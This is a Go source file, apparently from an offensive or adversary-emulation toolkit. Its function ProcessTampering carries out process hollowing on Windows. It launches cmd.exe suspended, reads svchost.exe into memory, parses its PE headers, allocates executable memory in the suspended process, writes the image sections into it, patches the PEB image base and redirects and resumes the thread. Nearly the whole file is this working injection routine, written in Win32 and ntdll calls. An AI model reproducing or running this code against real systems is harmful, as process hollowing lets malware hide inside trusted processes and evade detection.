package events

import (
	"log"
	"os"
	"runtime"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

type M128A struct {
	Low  uint64
	High int64
}

type XMM_SAVE_AREA32 struct {
	ControlWord    uint16
	StatusWord     uint16
	TagWord        byte
	Reserved1      byte
	ErrorOpcode    uint16
	ErrorOffset    uint32
	ErrorSelector  uint16
	Reserved2      uint16
	DataOffset     uint32
	DataSelector   uint16
	Reserved3      uint16
	MxCsr          uint32
	MxCsr_Mask     uint32
	FloatRegisters [8]M128A
	XmmRegisters   [16]M128A
	Reserved4      [96]byte
}

type CONTEXT struct {
	P1Home               uint64
	P2Home               uint64
	P3Home               uint64
	P4Home               uint64
	P5Home               uint64
	P6Home               uint64
	ContextFlags         uint32
	MxCsr                uint32
	SegCs                uint16
	SegDs                uint16
	SegEs                uint16
	SegFs                uint16
	SegGs                uint16
	SegSs                uint16
	EFlags               uint32
	Dr0                  uint64
	Dr1                  uint64
	Dr2                  uint64
	Dr3                  uint64
	Dr6                  uint64
	Dr7                  uint64
	Rax                  uint64
	Rcx                  uint64
	Rdx                  uint64
	Rbx                  uint64
	Rsp                  uint64
	Rbp                  uint64
	Rsi                  uint64
	Rdi                  uint64
	R8                   uint64
	R9                   uint64
	R10                  uint64
	R11                  uint64
	R12                  uint64
	R13                  uint64
	R14                  uint64
	R15                  uint64
	Rip                  uint64
	FloatSave            XMM_SAVE_AREA32 // Is a union normaly I kept only the biggest struct in it since it is supposed to work
	VectorRegister       [26]M128A
	VectorControl        uint64
	DebugControl         uint64
	LastBranchToRip      uint64
	LastBranchFromRip    uint64
	LastExceptionToRip   uint64
	LastExceptionFromRip uint64
}

// ----------------------------

type IMAGE_FILE_HEADER struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

// 64-bit version of the IMAGE_OPTIONAL_HEADER32
type IMAGE_OPTIONAL_HEADER64 struct {
	Magic                       uint16
	MajorLinkerVersion          byte
	MinorLinkerVersion          byte
	SizeOfCode                  uint32
	SizeOfInitializedData       uint32
	SizeOfUninitializedData     uint32
	AddressOfEntryPoint         uint32
	BaseOfCode                  uint32
	ImageBase                   uint64
	SectionAlignment            uint32
	FileAlignment               uint32
	MajorOperatingSystemVersion uint16
	MinorOperatingSystemVersion uint16
	MajorImageVersion           uint16
	MinorImageVersion           uint16
	MajorSubsystemVersion       uint16
	MinorSubsystemVersion       uint16
	Win32VersionValue           uint32
	SizeOfImage                 uint32
	SizeOfHeaders               uint32
	CheckSum                    uint32
	Subsystem                   uint16
	DllCharacteristics          uint16
	SizeOfStackReserve          uint64
	SizeOfStackCommit           uint64
	SizeOfHeapReserve           uint64
	SizeOfHeapCommit            uint64
	LoaderFlags                 uint32
	NumberOfRvaAndSizes         uint32
	IMAGE_DATA_DIRECTORY        [16]struct {
		VirtualAddress uint32
		Size           uint32
	}
}

type IMAGE_NT_HEADERS struct {
	Signature             uint32
	IMAGE_FILE_HEADER     IMAGE_FILE_HEADER
	IMAGE_OPTIONAL_HEADER IMAGE_OPTIONAL_HEADER64
}

type PIMAGE_OPTIONAL_HEADER64 *IMAGE_OPTIONAL_HEADER64

type PIMAGE_NT_HEADERS *IMAGE_NT_HEADERS

// ----------------------------

type IMAGE_DOS_HEADER struct {
	E_magic    uint16
	E_cblp     uint16
	E_cp       uint16
	E_crlc     uint16
	E_cparhdr  uint16
	E_minalloc uint16
	E_maxalloc uint16
	E_ss       uint16
	E_sp       uint16
	E_csum     uint16
	E_ip       uint16
	E_cs       uint16
	E_lfarlc   uint16
	E_ovno     uint16
	E_res      [4]uint16
	E_oemid    uint16
	E_oeminfo  uint16
	E_res2     [10]uint16
	E_lfanew   int32
}

type PIMAGE_DOS_HEADER *IMAGE_DOS_HEADER

// ----------------------------

const IMAGE_SIZEOF_SHORT_NAME = 8

type IMAGE_SECTION_HEADER struct {
	Name [IMAGE_SIZEOF_SHORT_NAME]byte
	Misc struct {
		PhysicalAddress uint32
		VirtualSize     uint32
	}
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

type PIMAGE_SECTION_HEADER *IMAGE_SECTION_HEADER

// ----------------------------

func ProcessTampering() {

	// create the replaced executable process
	var (
		replacedExecutablePath        = "C:\\Windows\\System32\\cmd.exe"
		temperingTargetExecutablePath = "C:\\Windows\\System32\\svchost.exe"
		processInformation            syscall.ProcessInformation
		startupInformation            syscall.StartupInfo
	)
	const (
		CREATE_SUSPENDED = 0x00000004
	)

	startupInformation.Cb = uint32(unsafe.Sizeof(startupInformation))
	replacedExecutablePathUTF16PtrFromString, _ := syscall.UTF16PtrFromString(replacedExecutablePath)
	if err := syscall.CreateProcess(
		nil,
		replacedExecutablePathUTF16PtrFromString,
		nil,
		nil,
		false,
		CREATE_SUSPENDED,
		nil,
		nil,
		&startupInformation,
		&processInformation,
	); err != nil {
		log.Panicf("[-] Error while creating a new process: %v\n", err)
		return
	} else {
		log.Printf("[+] Process created, startupInformation: %v\n", startupInformation)
		log.Printf("[+] Process created, processInformation: %v\n", processInformation)
	}

	// Open the targeet executable as file via CreateFileA()
	temperingTargetExecutablePathUTF16PtrFromString, _ := syscall.UTF16PtrFromString(temperingTargetExecutablePath)
	temperingTargetExecutableHFile, err := syscall.CreateFile(
		temperingTargetExecutablePathUTF16PtrFromString,
		syscall.GENERIC_READ,
		syscall.FILE_SHARE_READ,
		nil,
		syscall.OPEN_EXISTING,
		0,
		0,
	)
	if err != nil {
		log.Panicf("[-] Error while opening the target executable file: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	}

	if temperingTargetExecutableHFile == syscall.InvalidHandle {
		log.Panicf("[-] Error while opening the target executable file: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	} else {
		log.Printf("[+] Target executable file opened: %v\n", temperingTargetExecutableHFile)
	}

	// Get filesize of the target executable via Golang os function
	temperingTargetExecutableFileStat, err := os.Stat(temperingTargetExecutablePath)
	if err != nil {
		log.Panicf("[-] Error while getting the file stat of the target executable: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	}
	temperingTargetExecutableFileSize := temperingTargetExecutableFileStat.Size()
	defer syscall.CloseHandle(temperingTargetExecutableHFile)

	// Allocate virtual memory for the target executable via VirtualAllocEx()
	var (
		kernel32DLL               = syscall.NewLazyDLL("kernel32.dll")
		kernel32DLLVirtualAlloc   = kernel32DLL.NewProc("VirtualAlloc")
		kernel32DLLVirtualAllocEx = kernel32DLL.NewProc("VirtualAllocEx")
		kernel32DLLReadFile       = kernel32DLL.NewProc("ReadFile")
		kernel32DLLVirtualFree    = kernel32DLL.NewProc("VirtualFree")
	)

	var image uintptr
	image, _, err = kernel32DLLVirtualAlloc.Call(
		uintptr(0),
		uintptr(temperingTargetExecutableFileSize),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_READWRITE,
	)
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Panicf("[-] Error while allocating virtual memory for the target executable: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	} else {
		log.Printf("[+] Virtual memory allocated for the target executable: 0x%X\n", image)
	}

	// Read the target executable file into the allocated virtual memory via ReadFile()
	var imageReadBytes uint32
	_, _, err = kernel32DLLReadFile.Call(
		uintptr(temperingTargetExecutableHFile),
		uintptr(image),
		uintptr(temperingTargetExecutableFileSize),
		uintptr(unsafe.Pointer(&imageReadBytes)),
		uintptr(0))
	if err != nil && err.Error() != "The operation completed successfully." {
		log.Panicf("[-] Error while reading the target executable file into the allocated virtual memory: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	} else {
		_ = syscall.CloseHandle(temperingTargetExecutableHFile)
		log.Printf("[+] Target executable file read into the allocated virtual memory: %v\n", imageReadBytes)
	}

	// Check if the loaded image has a valid DOS signature
	const (
		IMAGE_DOS_SIGNATURE = 0x5A4D
		SYSTEM_32BIT        = runtime.GOARCH == "386"
		SYSTEM_64BIT        = runtime.GOARCH == "amd64"
	)
	var (
		ntDLL                     = syscall.NewLazyDLL("ntdll.dll")
		ntDLLNtGetContextThread   = ntDLL.NewProc("NtGetContextThread")
		ntDLLNtReadVirtualMemory  = ntDLL.NewProc("NtReadVirtualMemory")
		ntDLLNtWriteVirtualMemory = ntDLL.NewProc("NtWriteVirtualMemory")
		ntDLLNtUnmapViewOfSection = ntDLL.NewProc("NtUnmapViewOfSection")
		NtSetContextThread        = ntDLL.NewProc("NtSetContextThread")
		NtResumeThread            = ntDLL.NewProc("NtResumeThread")
		NtWaitForSingleObject     = ntDLL.NewProc("NtWaitForSingleObject")
	)
	processDOSHeader := (PIMAGE_DOS_HEADER)(unsafe.Pointer(image))
	if processDOSHeader.E_magic != IMAGE_DOS_SIGNATURE {
		log.Panicf("[-] The loaded image doesn't have a valid DOS signature: 0x%X\n", processDOSHeader.E_magic)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	} else {
		log.Printf("[+] The loaded image has a valid DOS signature: 0x%X\n", processDOSHeader.E_magic)

	}

	var context CONTEXT            // context(any) is actually a CONTEXT structure defined in windows API(winnt.h)
	context.ContextFlags = 0x10007 // CONTEXT_FULL = 0x10007

	// Create processNTHeaders variable to store the NT headers of the loaded image according to the architecture
	processNTHeaders := (PIMAGE_NT_HEADERS)(unsafe.Pointer(image + uintptr(processDOSHeader.E_lfanew)))
	_, _, err = ntDLLNtGetContextThread.Call(
		uintptr(processInformation.Thread),
		uintptr(unsafe.Pointer(&context)),
	)
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error while getting the context of the thread: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	} else {
		log.Printf("[+] Process Headers: %v\n", processNTHeaders)
	}

	// -----------------------------
	// Allocate virtual memory for the target process
	var baseAddress uint64
	if SYSTEM_64BIT {
		SIZE_T_SIZE := uint64(8) // 64-bit, 8 bytes
		if _, _, err := ntDLLNtReadVirtualMemory.Call(
			uintptr(processInformation.Process),
			uintptr(context.Rdx+(SIZE_T_SIZE*2)),
			uintptr(unsafe.Pointer(&baseAddress)), // <--- PEB struct
			uintptr(unsafe.Sizeof(baseAddress)),   // <--- PEB struct size
			uintptr(0),                            // (optional)
		); err != syscall.Errno(0) {
			log.Panicf("[-] Error while reading the virtual memory of the process: %v\n", err)
			_ = syscall.TerminateProcess(processInformation.Process, 1)
			return
		} else {
			log.Printf("[+] Base Address(x64): 0x%X\n", baseAddress)
			log.Printf("[+] context.Rdx: 0x%X\n", context.Rdx)
		}
	} else if SYSTEM_32BIT {
		// 32-bit is not supported
		log.Printf("[-] Due to technical situations, 32-bit architecutre is not supported for ProcessTampering\n")
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	}

	// Unmap the original executable image from the target process if its base address matches
	// Usually not executed since the base address of the original executable image is different from the base address of the target process

	if baseAddress == processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase {
		log.Printf("[+] Unmapping the original executable image from the target process: %v\n", baseAddress)
		if result, _, err := ntDLLNtUnmapViewOfSection.Call(
			uintptr(processInformation.Process),
			uintptr(unsafe.Pointer(&baseAddress)),
		); err != syscall.Errno(0) {
			log.Panicf("[-] Error while unmapping the original executable image from the target process: %v\n", err)
			_ = syscall.TerminateProcess(processInformation.Process, 1)
			return
		} else {
			log.Printf("[+] Unmapping result: %v\n", result)
		}
	}

	log.Printf("[+] Process Handle: %v\n", processInformation.Process)
	processMemory, _, err := kernel32DLLVirtualAllocEx.Call(
		uintptr(processInformation.Process),
		uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase),
		uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.SizeOfImage),
		MEM_COMMIT|MEM_RESERVE,
		syscall.PAGE_EXECUTE_READWRITE)

	if (err != nil && err.Error() != "The operation completed successfully.") || int(processMemory) == 0 {
		log.Printf("[?] ImageBase: 0x%X\n", processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase)
		log.Printf("[?] SizeOfImage: 0x%X\n", processNTHeaders.IMAGE_OPTIONAL_HEADER.SizeOfImage)
		log.Panicf("[-] Error while allocating virtual memory for the target process: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	}

	_, _, err = ntDLLNtWriteVirtualMemory.Call(
		uintptr(processInformation.Process),
		uintptr(processMemory),
		uintptr(image),
		uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.SizeOfHeaders),
		uintptr(0))
	if err != syscall.Errno(0) {
		log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
		_ = syscall.TerminateProcess(processInformation.Process, 1)
		return
	}

	// Write the sections of the target executable into the allocated virtual memory via WriteProcessMemory()
	for i := 0; i < int(processNTHeaders.IMAGE_FILE_HEADER.NumberOfSections); i++ {
		sectionHeader := (PIMAGE_SECTION_HEADER)(unsafe.Pointer(
			uintptr(image) +
				uintptr(processDOSHeader.E_lfanew) +
				uintptr(unsafe.Sizeof(IMAGE_NT_HEADERS{})) +
				uintptr(i)*uintptr(unsafe.Sizeof(IMAGE_SECTION_HEADER{}))))
		_, _, err = ntDLLNtWriteVirtualMemory.Call(
			uintptr(processInformation.Process),
			uintptr(processMemory+uintptr(sectionHeader.VirtualAddress)),
			uintptr(unsafe.Pointer(image+uintptr(sectionHeader.PointerToRawData))),
			uintptr(sectionHeader.SizeOfRawData),
			uintptr(0))
		if err != syscall.Errno(0) {
			log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
			_ = syscall.TerminateProcess(processInformation.Process, 1)
			return
		}
	}

	// Update the context of the target process to the entry point of the target executable
	if SYSTEM_64BIT {
		SIZE_T_SIZE := 8
		PVOID_SIZE := 8
		context.Rcx = uint64(processMemory + uintptr(processNTHeaders.IMAGE_OPTIONAL_HEADER.AddressOfEntryPoint))
		_, _, err = ntDLLNtWriteVirtualMemory.Call(
			uintptr(processInformation.Process),
			uintptr(context.Rdx+uint64(SIZE_T_SIZE*2)),
			uintptr(unsafe.Pointer(&processNTHeaders.IMAGE_OPTIONAL_HEADER.ImageBase)),
			uintptr(PVOID_SIZE),
			uintptr(0))
		if err != syscall.Errno(0) {
			log.Panicf("[-] Error while writing the virtual memory of the process: %v\n", err)
			_ = syscall.TerminateProcess(processInformation.Process, 1)
			return
		}
	}

	// Set the context of the target process to the updated context
	_, _, _ = NtSetContextThread.Call(
		uintptr(processInformation.Thread),
		uintptr(unsafe.Pointer(&context)))
	_, _, _ = NtResumeThread.Call(
		uintptr(processInformation.Thread),
		uintptr(0))
	_, _, _ = NtWaitForSingleObject.Call(
		uintptr(processInformation.Process),
		uintptr(0),
		uintptr(0))
	err = syscall.CloseHandle(processInformation.Process)
	if err != nil {
		log.Panicf("[-] Error while closing the handles of the process(free'ing Process handle): %v\n", err)
		return
	}

	// Close the handles of the process
	err = syscall.CloseHandle(processInformation.Thread)
	if err != nil {
		log.Panicf("[-] Error while closing the handles of the process(free'ing Thread handle): %v\n", err)
		return
	}

	// Free the allocated virtual memory for the target executable via VirtualFree()
	if image != uintptr(0) {
		_, _, err = kernel32DLLVirtualFree.Call(
			uintptr(image),
			uintptr(0),
			uintptr(windows.MEM_RELEASE))
		if err != syscall.Errno(0) {
			log.Panicf("[-] Error while freeing the virtual memory: %v\n", err)
			return
		} else {
			log.Printf("[+] Virtual memory freed: 0x%X\n", image)
			log.Printf("[+] Process Tempering Completed\n")
		}
	}

}
